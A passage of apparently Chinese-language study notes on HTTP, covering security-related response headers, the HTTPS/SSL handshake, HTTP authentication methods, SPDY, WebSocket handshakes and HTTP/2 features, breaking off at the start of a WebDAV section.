href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">status=enable</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p>\n<h3 id=\"其他首部字段\"><a href=\"#其他首部字段\" class=\"headerlink\" title=\"其他首部字段\"></a>其他首部字段</h3><p>HTTP 首部字段是可以自行扩展的。</p>\n<table>\n<thead>\n<tr>\n<th>X-Frame-Options</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>X-XSS-Protection</td>\n</tr>\n<tr>\n<td>DNT</td>\n</tr>\n<tr>\n<td>P3P</td>\n</tr>\n</tbody></table>\n<h4 id=\"X-Frame-Options\"><a href=\"#X-Frame-Options\" class=\"headerlink\" title=\"X-Frame-Options\"></a>X-Frame-Options</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">X-Frame-Options</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">DENY</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p>\n<h5 id=\"字段\"><a href=\"#字段\" class=\"headerlink\" title=\"字段\"></a>字段</h5><ul>\n<li><strong>DENY</strong> ：拒绝</li>\n<li><strong>SAMEORIGIN</strong> ：仅同源域名下的页面（Top-level-browsing- context）匹配时许可。（比如，当指定 <a href=\"http://hackr.jp/sample.html\">http://hackr.jp/sample.html </a>页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）</li>\n</ul>\n<h5 id=\"apache2-conf-的配置实例\"><a href=\"#apache2-conf-的配置实例\" class=\"headerlink\" title=\"apache2.conf 的配置实例\"></a><strong>apache2.conf</strong> 的配置实例</h5><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">&lt;IfModule mod_headers.c&gt;\nHeader append X-FRAME-OPTIONS \"SAMEORIGIN\"\n&lt;/IfModule&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"X-XSS-Protection\"><a href=\"#X-XSS-Protection\" class=\"headerlink\" title=\"X-XSS-Protection\"></a>X-XSS-Protection</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">X-XSS-Protection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p>\n<ul>\n<li>0：将 XSS 过滤设置成无效状态</li>\n<li>1：将 XSS 过滤设置成有效状态</li>\n</ul>\n<h4 id=\"DNT\"><a href=\"#DNT\" class=\"headerlink\" title=\"DNT\"></a>DNT</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">DNT</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>\n<ul>\n<li>0：同意被追踪</li>\n<li>1：拒绝被追踪</li>\n</ul>\n<h4 id=\"P3P\"><a href=\"#P3P\" class=\"headerlink\" title=\"P3P\"></a>P3P</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">P3P</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">CP=\"CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。</p>\n<p>要进行 P3P 的设定，需按以下操作步骤进行。</p>\n<p>步骤 <strong>1</strong>：创建 P3P 隐私</p>\n<p>步骤 <strong>2</strong>：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml</p>\n<p>步骤 <strong>3</strong>：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中</p>\n<h2 id=\"确保-Web-安全的HTTPS\"><a href=\"#确保-Web-安全的HTTPS\" class=\"headerlink\" title=\"确保 Web 安全的HTTPS\"></a>确保 <strong>Web</strong> 安全的HTTPS</h2><p>在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS 通信机制可以有效地防止这些问题。</p>\n<h3 id=\"HTTP的缺点\"><a href=\"#HTTP的缺点\" class=\"headerlink\" title=\"HTTP的缺点\"></a>HTTP的缺点</h3><ul>\n<li><p>通信使用明文（不加密），内容可能会被窃听</p>\n</li>\n<li><p>不验证通信方的身份，因此有可能遭遇伪装</p>\n</li>\n<li><p>无法证明报文的完整性，所以有可能已遭篡改</p>\n</li>\n</ul>\n<h4 id=\"通信使用明文（不加密），内容可能会被窃听\"><a href=\"#通信使用明文（不加密），内容可能会被窃听\" class=\"headerlink\" title=\"通信使用明文（不加密），内容可能会被窃听\"></a>通信使用明文（不加密），内容可能会被窃听</h4><p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p>\n<ul>\n<li><p><strong>TCP/IP</strong> 是可能被窃听的网络</p>\n<p>互联网上的任何角落都存在通信内容被窃听的风险</p>\n<p>即使加密的处理过的通信任会被监听，只是监听者还需要破解报文信息</p>\n</li>\n<li><p>加密处理防止被窃听</p>\n<ul>\n<li><p>通信的加密</p>\n<p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p>\n</li>\n<li><p>内容的加密</p>\n<p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p>\n<p>把HTTP 报文里所含的内容进行加密处理。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/ebf75f3e4a4d5757e3628065a63e4971.png\"></p>\n<h4 id=\"不验证通信方的身份就可能遭遇伪装\"><a href=\"#不验证通信方的身份就可能遭遇伪装\" class=\"headerlink\" title=\"不验证通信方的身份就可能遭遇伪装\"></a>不验证通信方的身份就可能遭遇伪装</h4><p>HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</p>\n<h5 id=\"任何人都可发起请求\"><a href=\"#任何人都可发起请求\" class=\"headerlink\" title=\"任何人都可发起请求\"></a>任何人都可发起请求</h5><p>HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应。</p>\n<ul>\n<li>无法判断发出的请求是否到达理想服务器，伪装服务器</li>\n<li>无法判断响应是理想客服端发来的，伪造客服端</li>\n<li>无法判断对方是否具有访问权限</li>\n<li>无法判断是否会发给理想客户端</li>\n</ul>\n<h5 id=\"查明对手的证书\"><a href=\"#查明对手的证书\" class=\"headerlink\" title=\"查明对手的证书\"></a>查明对手的证书</h5><p>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/5b8c38026530678e13e723170dad0f13.png\"></p>\n<h4 id=\"无法证明报文完整性，可能已遭篡改\"><a href=\"#无法证明报文完整性，可能已遭篡改\" class=\"headerlink\" title=\"无法证明报文完整性，可能已遭篡改\"></a>无法证明报文完整性，可能已遭篡改</h4><p>所谓完整性是指信息的准确度。</p>\n<h5 id=\"接收到的内容可能有误\"><a href=\"#接收到的内容可能有误\" class=\"headerlink\" title=\"接收到的内容可能有误\"></a>接收到的内容可能有误</h5><p>在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/6b6927be25adafe4f71d33db42272962.png\"></p>\n<h5 id=\"如何防止篡改\"><a href=\"#如何防止篡改\" class=\"headerlink\" title=\"如何防止篡改\"></a>如何防止篡改</h5><p>其中常用的是 MD5 和 SHA-1 等散列值校验的方法， 以及用来确认文件的数字签名方法。这些算法也会被改写。</p>\n<h3 id=\"HTTP-加密-认证-完整性保护-HTTPS\"><a href=\"#HTTP-加密-认证-完整性保护-HTTPS\" class=\"headerlink\" title=\"HTTP+ 加密 + 认证 + 完整性保护**=HTTPS**\"></a><strong>HTTP+</strong> 加密 <strong>+</strong> 认证 <strong>+</strong> 完整性保护**=HTTPS**</h3><h4 id=\"HTTP-加上加密处理和认证以及完整性保护后即是HTTPS\"><a href=\"#HTTP-加上加密处理和认证以及完整性保护后即是HTTPS\" class=\"headerlink\" title=\"HTTP 加上加密处理和认证以及完整性保护后即是HTTPS\"></a><strong>HTTP</strong> 加上加密处理和认证以及完整性保护后即是HTTPS</h4><p>把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/e837127d056258e30e3e134a207e6791.png\"></p>\n<h4 id=\"HTTPS-是身披-SSL-外壳的-HTTP\"><a href=\"#HTTPS-是身披-SSL-外壳的-HTTP\" class=\"headerlink\" title=\"HTTPS 是身披 SSL 外壳的 HTTP\"></a><strong>HTTPS</strong> 是身披 <strong>SSL</strong> 外壳的 <strong>HTTP</strong></h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/140c9e47c4065dfc522e3e412df99331.png\"></p>\n<h4 id=\"相互交换密钥的公开密钥加密技术\"><a href=\"#相互交换密钥的公开密钥加密技术\" class=\"headerlink\" title=\"相互交换密钥的公开密钥加密技术\"></a>相互交换密钥的公开密钥加密技术</h4><p>SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。</p>\n<ul>\n<li>共享密钥加密的困境</li>\n<li>使用两把密钥的公开密钥加密</li>\n<li><strong>HTTPS</strong> 采用混合加密机制</li>\n</ul>\n<h4 id=\"证明公开密钥正确性的证书\"><a href=\"#证明公开密钥正确性的证书\" class=\"headerlink\" title=\"证明公开密钥正确性的证书\"></a>证明公开密钥正确性的证书</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/a60a859278525e0944814a22d2dc2c4a.png\"></p>\n<ul>\n<li><p>可证明组织真实性的 <strong>EV SSL</strong> 证书</p>\n<p>证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSL Certificate）。</p>\n</li>\n<li><p>用以确认客户端的客户端证书</p>\n<p>HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。</p>\n</li>\n<li><p>认证机构信誉第一</p>\n</li>\n<li><p>由自认证机构颁发的证书称为自签名证书</p>\n</li>\n</ul>\n<h4 id=\"HTTPS-的安全通信机制\"><a href=\"#HTTPS-的安全通信机制\" class=\"headerlink\" title=\"HTTPS 的安全通信机制\"></a><strong>HTTPS</strong> 的安全通信机制</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/8fd4f672653f4ee626fa9d20a1ed5f5c.png\"></p>\n<p>步骤 <strong>1</strong>： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p>\n<p>步骤 <strong>2</strong>： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p>\n<p>步骤 <strong>3</strong>： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p>\n<p>步骤 <strong>4</strong>： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p>\n<p>步骤 <strong>5</strong>： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p>\n<p>步骤 <strong>6</strong>： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p>\n<p>步骤 <strong>7</strong>： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p>\n<p>步骤 <strong>8</strong>： 服务器同样发送 Change Cipher Spec 报文。</p>\n<p>步骤 <strong>9</strong>： 服务器同样发送 Finished 报文。</p>\n<p>步骤 <strong>10</strong>： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p>\n<p>步骤 <strong>11</strong>： 应用层协议通信，即发送 HTTP 响应。</p>\n<p>步骤 <strong>12</strong>： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p>\n<p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/c4d634280d5777af7ef7eb4b434c7791.png\"></p>\n<p>从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程</p>\n<h4 id=\"SSL和TLS\"><a href=\"#SSL和TLS\" class=\"headerlink\" title=\"SSL和TLS\"></a>SSL和TLS</h4><p>HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。</p>\n<p>SSL目前主导权已转移到IETF，IETF以SSL3.0为基准，后制定了TLS1.0、TLS1.1、TLS1.2。</p>\n<p>当前主流SSL3.0、TLS1.0</p>\n<h5 id=\"small-tips\"><a href=\"#small-tips\" class=\"headerlink\" title=\"small_tips\"></a>small_tips</h5><ul>\n<li><strong>HTTPS</strong> 比 <strong>HTTP</strong> 要慢 <strong>2</strong> 到 <strong>100</strong> 倍</li>\n</ul>\n<h2 id=\"确认访问用户身份的认证\"><a href=\"#确认访问用户身份的认证\" class=\"headerlink\" title=\"确认访问用户身份的认证\"></a>确认访问用户身份的认证</h2><p>某些 Web 页面只想让特定的人浏览</p>\n<h3 id=\"何为认证\"><a href=\"#何为认证\" class=\"headerlink\" title=\"何为认证\"></a>何为认证</h3><p>为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。</p>\n<h4 id=\"HTTP-1-1-使用的认证方式\"><a href=\"#HTTP-1-1-使用的认证方式\" class=\"headerlink\" title=\"HTTP/1.1 使用的认证方式\"></a>HTTP/1.1 使用的认证方式</h4><ul>\n<li><strong>BASIC</strong> 认证（基本认证）</li>\n<li><strong>DIGEST</strong> 认证（摘要认证）</li>\n<li><strong>SSL</strong> 客户端认证</li>\n<li><strong>FormBase</strong> 认证（基于表单认证）</li>\n<li>Windows 统一认证（Keberos 认证、NTLM 认证）</li>\n</ul>\n<h3 id=\"BASIC-认证（基本认证）\"><a href=\"#BASIC-认证（基本认证）\" class=\"headerlink\" title=\"BASIC 认证（基本认证）\"></a><strong>BASIC</strong> 认证（基本认证）</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/922d89ad738f1561e68b4dc757c68789.png\"></p>\n<p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，在HTTP这种非加密信道通信就会被截获。</p>\n<h3 id=\"DIGEST-认证（摘要认证）\"><a href=\"#DIGEST-认证（摘要认证）\" class=\"headerlink\" title=\"DIGEST 认证（摘要认证）\"></a><strong>DIGEST</strong> 认证（摘要认证）</h3><p>DIGEST 认证同样使用质询 / 响应的方式</p>\n<p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d2892338940c78fc33f6406e7091220c.png\"></p>\n<p>DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p>\n<h3 id=\"SSL-客户端认证\"><a href=\"#SSL-客户端认证\" class=\"headerlink\" title=\"SSL 客户端认证\"></a><strong>SSL</strong> 客户端认证</h3><p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书认证，服务器可确认访问是否来自已登录的客户端。</p>\n<h4 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h4><p>步骤 <strong>1</strong>： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p>\n<p>步骤 <strong>2</strong>： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。</p>\n<p>步骤 <strong>3</strong>： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</p>\n<h4 id=\"SSL-客户端认证采用双因素认证\"><a href=\"#SSL-客户端认证采用双因素认证\" class=\"headerlink\" title=\"SSL 客户端认证采用双因素认证\"></a><strong>SSL</strong> 客户端认证采用双因素认证</h4><p>在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证组合形成一种双因素认证（Two-factor authentication）来使用。换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p>\n<h4 id=\"SSL-客户端认证必要的费用（证书）\"><a href=\"#SSL-客户端认证必要的费用（证书）\" class=\"headerlink\" title=\"SSL 客户端认证必要的费用（证书）\"></a><strong>SSL</strong> 客户端认证必要的费用（证书）</h4><h3 id=\"基于表单认证\"><a href=\"#基于表单认证\" class=\"headerlink\" title=\"基于表单认证\"></a>基于表单认证</h3><p>客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。</p>\n<h5 id=\"认证多半为基于表单认证\"><a href=\"#认证多半为基于表单认证\" class=\"headerlink\" title=\"认证多半为基于表单认证\"></a>认证多半为基于表单认证</h5><p><strong>Session</strong> 管理及 <strong>Cookie</strong> 应用</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/2e8062821a51e04c45ae2ac8e7aa8fa1.png\"></p>\n<h2 id=\"基于-HTTP-的功能追加协议\"><a href=\"#基于-HTTP-的功能追加协议\" class=\"headerlink\" title=\"基于 HTTP 的功能追加协议\"></a>基于 <strong>HTTP</strong> 的功能追加协议</h2><h4 id=\"基于-HTTP-的协议\"><a href=\"#基于-HTTP-的协议\" class=\"headerlink\" title=\"基于 HTTP 的协议\"></a>基于 <strong>HTTP</strong> 的协议</h4><h4 id=\"消除-HTTP-瓶颈的-SPDY\"><a href=\"#消除-HTTP-瓶颈的-SPDY\" class=\"headerlink\" title=\"消除 HTTP 瓶颈的 SPDY\"></a>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></h4><h5 id=\"HTTP-瓶颈\"><a href=\"#HTTP-瓶颈\" class=\"headerlink\" title=\"HTTP 瓶颈\"></a><strong>HTTP</strong> 瓶颈</h5><p><img src=\"https://images.dadream.eu.org/images/2024/07/a6c1ddf897e03fc581cd5fd4f7990a4c.png\"></p>\n<ul>\n<li><p>Ajax解决</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d26bb569fc6c3b4263f786cd14533727.png\"></p>\n</li>\n<li><p><strong>Comet</strong> 解决</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/0bace5d97336e00fd7d4f6932defe557.png\"></p>\n</li>\n<li><p>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></p>\n</li>\n</ul>\n<h4 id=\"SPDY-的设计与功能\"><a href=\"#SPDY-的设计与功能\" class=\"headerlink\" title=\"SPDY 的设计与功能\"></a><strong>SPDY</strong> 的设计与功能</h4><p>SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。</p>\n<p>SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/fb54f1e32d646b366d829a2c9a887ad3.png\"></p>\n<h5 id=\"新功能\"><a href=\"#新功能\" class=\"headerlink\" title=\"新功能\"></a>新功能</h5><ul>\n<li>多路复用流</li>\n<li>赋予请求优先级</li>\n<li>压缩 <strong>HTTP</strong> 首部</li>\n<li>推送功能</li>\n<li>服务器提示功能</li>\n</ul>\n<h4 id=\"SPDY-大体上消除了-Web-瓶颈\"><a href=\"#SPDY-大体上消除了-Web-瓶颈\" class=\"headerlink\" title=\"SPDY 大体上消除了 Web 瓶颈\"></a><strong>SPDY</strong> 大体上消除了 <strong>Web</strong> 瓶颈</h4><h3 id=\"使用浏览器进行全双工通信的WebSocket\"><a href=\"#使用浏览器进行全双工通信的WebSocket\" class=\"headerlink\" title=\"使用浏览器进行全双工通信的WebSocket\"></a>使用浏览器进行全双工通信的<strong>WebSocket</strong></h3><p>WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。</p>\n<p> WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。</p>\n<h4 id=\"WebSocket-协议\"><a href=\"#WebSocket-协议\" class=\"headerlink\" title=\"WebSocket 协议\"></a>WebSocket 协议</h4><p>一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。</p>\n<p>由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。</p>\n<h5 id=\"新特点\"><a href=\"#新特点\" class=\"headerlink\" title=\"新特点\"></a>新特点</h5><ul>\n<li>推送功能</li>\n<li>减少通信量</li>\n</ul>\n<h4 id=\"实现-WebSocket-通信\"><a href=\"#实现-WebSocket-通信\" class=\"headerlink\" title=\"实现 WebSocket 通信\"></a>实现 WebSocket 通信</h4><p>完成一次握手</p>\n<h5 id=\"握手请求\"><a href=\"#握手请求\" class=\"headerlink\" title=\"握手请求\"></a>握手请求</h5><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">GET /chat  HTTP/1.1 \n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">server.example.com </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">websocket Connection: Upgrade</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-WebSocket-Key</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">dGhlIHNhbXBsZSBub25jZQ== </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://example.com</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-WebSocket-Protocol</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">chat, superchat </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-WebSocket-Version</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">13</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变。</p>\n<p>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。</p>\n<h5 id=\"握手响应\"><a href=\"#握手响应\" class=\"headerlink\" title=\"握手响应\"></a>握手响应</h5><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">101</span> <span class=\"token reason-phrase string\">Switching Protocols</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">websocket </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Upgrade</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-WebSocket-Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">s3pPLMBiTxaQ9kYGzzhZRbK+xOo= </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Sec-WebSocket-Protocol</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">chat</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/1c6be636e6391922df500391f6f0a9d2.png\"></p>\n<h4 id=\"WebSocket-API\"><a href=\"#WebSocket-API\" class=\"headerlink\" title=\"WebSocket API\"></a>WebSocket API</h4><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> socket <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">WebSocket</span><span class=\"token punctuation\">(</span>'ws<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>game<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>com<span class=\"token operator\">:</span><span class=\"token number\">12010</span><span class=\"token operator\">/</span> socket<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onopen</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>bufferedAmount <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> socket<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">getUpdateData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"HTTP-2-0\"><a href=\"#HTTP-2-0\" class=\"headerlink\" title=\"HTTP/2.0\"></a>HTTP/2.0</h3><h4 id=\"HTTP-2-0特点\"><a href=\"#HTTP-2-0特点\" class=\"headerlink\" title=\"HTTP/2.0特点\"></a>HTTP/2.0特点</h4><table>\n<thead>\n<tr>\n<th>压缩</th>\n<th><strong>SPDY</strong>、<strong>Friendly</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>多路复用</td>\n<td>SPDY</td>\n</tr>\n<tr>\n<td>TLS 义务化</td>\n<td>Speed＋ Mobility</td>\n</tr>\n<tr>\n<td>协商</td>\n<td>Speed＋ Mobility，Friendly</td>\n</tr>\n<tr>\n<td>客户端拉曳（Client Pull）/服务器推送  （Server Push）</td>\n<td>Speed＋ Mobility</td>\n</tr>\n<tr>\n<td>流量控制</td>\n<td>SPDY</td>\n</tr>\n<tr>\n<td>WebSocket</td>\n<td>Speed＋ Mobility</td>\n</tr>\n</tbody></table>\n<p>注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTP Upgrade 简写为 Friendly。</p>\n<h3 id=\"Web-服务器管理文件的-WebDAV\"><a href=\"#Web-服务器管理文件的-WebDAV\" class=\"headerlink\" title=\"Web 服务器管理文件的 WebDAV\"></a><strong>Web</strong> 服务器管理文件的 <strong>WebDAV</strong></h3><p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 